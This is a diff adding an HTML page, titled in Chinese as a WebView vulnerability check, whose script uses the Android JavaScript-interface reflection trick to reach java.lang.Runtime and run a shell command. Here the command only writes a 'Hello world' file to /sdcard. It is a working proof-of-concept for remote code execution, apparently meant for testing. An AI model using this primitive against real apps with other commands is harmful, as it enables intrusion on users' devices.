@@ -1,0 +1,34 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8"/>
+    <title>WebView 漏洞检测</title>
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+</head>
+<body>
+<script>
+
+function execute(cmdArgs)
+
+{
+    return JavaScriptInterface.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+}
+
+
+
+try{
+
+    execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/yuday.txt"]);
+
+}catch(e){
+
+    alert(e);
+
+}
+
+
+</script>
+</body>
+</html>
+
